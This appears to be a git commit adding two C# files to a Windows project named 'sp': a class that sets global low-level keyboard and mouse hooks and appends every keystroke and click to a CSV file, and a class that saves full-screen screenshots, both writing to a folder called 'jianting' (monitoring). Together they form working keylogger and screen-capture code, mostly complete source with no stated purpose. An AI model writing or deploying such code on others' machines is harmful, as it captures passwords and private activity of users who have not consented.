ac4ee38109c9a16968007b72df2a6d5228bd4aa8
Jinchangda <3073625256@qq.com>
2024-07-11 17:39:31 +0800

    添加项目文件。

---
+++ sp/GlobalHookHelper.cs
@@ -0,0 +1,120 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace sp
+{
+    public class GlobalHookHelper
+    {
+        private static LowLevelKeyboardProc _keyboardProc = KeyboardHookCallback;
+        private static LowLevelMouseProc _mouseProc = MouseHookCallback;
+        private static IntPtr _keyboardHookID = IntPtr.Zero;
+        private static IntPtr _mouseHookID = IntPtr.Zero;
+        private static StreamWriter _writer;
+
+        public static void Start()
+        {
+            _keyboardHookID = SetKeyboardHook(_keyboardProc);
+            _mouseHookID = SetMouseHook(_mouseProc);
+
+            var directoryPath = @"D:\jianting";
+            if (!Directory.Exists(directoryPath))
+            {
+                Directory.CreateDirectory(directoryPath);
+            }
+
+            _writer = new StreamWriter(Path.Combine(directoryPath, "key_mouse_events.csv"), true, Encoding.UTF8)
+            {
+                AutoFlush = true
+            };
+            _writer.WriteLine("EventType,Timestamp,KeyCode,KeyChar");
+        }
+
+        public static void Stop()
+        {
+            UnhookWindowsHookEx(_keyboardHookID);
+            UnhookWindowsHookEx(_mouseHookID);
+            _writer?.Close();
+        }
+
+        private static IntPtr SetKeyboardHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private static IntPtr SetMouseHook(LowLevelMouseProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_MOUSE_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                string eventType = wParam == (IntPtr)WM_KEYDOWN ? "KeyDown" : "KeyUp";
+                string timestamp = DateTime.Now.ToString("o");
+                string keyChar = ((Keys)vkCode).ToString();
+                _writer.WriteLine($"{eventType},{timestamp},{vkCode},{keyChar}");
+            }
+            return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
+        }
+
+        private static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && (wParam == (IntPtr)WM_LBUTTONDOWN || wParam == (IntPtr)WM_RBUTTONDOWN))
+            {
+                string eventType = wParam == (IntPtr)WM_LBUTTONDOWN ? "LeftClick" : "RightClick";
+                string timestamp = DateTime.Now.ToString("o");
+                _writer.WriteLine($"{eventType},{timestamp},,");
+            }
+            return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
+        }
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WH_MOUSE_LL = 14;
+        private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
+        private const int WM_LBUTTONDOWN = 0x0201;
+        private const int WM_RBUTTONDOWN = 0x0204;
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        private enum Keys
+        {
+            A = 65, B = 66, C = 67, D = 68, E = 69, F = 70, G = 71, H = 72, I = 73, J = 74, K = 75, L = 76, M = 77,
+            N = 78, O = 79, P = 80, Q = 81, R = 82, S = 83, T = 84, U = 85, V = 86, W = 87, X = 88, Y = 89, Z = 90,
+            D0 = 48, D1 = 49, D2 = 50, D3 = 51, D4 = 52, D5 = 53, D6 = 54, D7 = 55, D8 = 56, D9 = 57,
+            F1 = 112, F2 = 113, F3 = 114, F4 = 115, F5 = 116, F6 = 117, F7 = 118, F8 = 119, F9 = 120, F10 = 121, F11 = 122, F12 = 123,
+            Enter = 13, Space = 32, LeftCtrl = 162, RightCtrl = 163, LeftAlt = 164, RightAlt = 165, LeftShift = 160, RightShift = 161
+            // Add other keys as needed
+        }
+    }
+}
---
+++ sp/ScreenCaptureHelper.cs
@@ -0,0 +1,73 @@
+﻿using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+
+namespace sp
+{
+    public class ScreenCaptureHelper
+    {
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetDesktopWindow();
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetWindowDC(IntPtr hWnd);
+
+        [DllImport("gdi32.dll")]
+        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
+
+        [DllImport("gdi32.dll")]
+        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
+
+        [DllImport("gdi32.dll")]
+        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
+
+        [DllImport("gdi32.dll")]
+        private static extern IntPtr DeleteObject(IntPtr hObject);
+
+        [DllImport("user32.dll")]
+        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        public async Task CaptureScreenAsync()
+        {
+            var desktopWnd = GetDesktopWindow();
+            var desktopDC = GetWindowDC(desktopWnd);
+            var memoryDC = CreateCompatibleDC(desktopDC);
+
+            var width = GetSystemMetrics(0);
+            var height = GetSystemMetrics(1);
+
+            var bitmap = CreateCompatibleBitmap(desktopDC, width, height);
+            var oldBitmap = SelectObject(memoryDC, bitmap);
+
+            BitBlt(memoryDC, 0, 0, width, height, desktopDC, 0, 0, 0x00CC0020);
+
+            SelectObject(memoryDC, oldBitmap);
+            DeleteDC(memoryDC);
+            ReleaseDC(desktopWnd, desktopDC);
+
+            var bmp = Image.FromHbitmap(bitmap);
+            DeleteObject(bitmap);
+
+            var directoryPath = @"D:\jianting";
+            if (!Directory.Exists(directoryPath))
+            {
+                Directory.CreateDirectory(directoryPath);
+            }
+
+            var filePath = Path.Combine(directoryPath, $"Screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
+            bmp.Save(filePath, ImageFormat.Png);
+        }
+
+        [DllImport("gdi32.dll")]
+        private static extern int DeleteDC(IntPtr hdc);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern int GetSystemMetrics(int nIndex);
+    }
+}
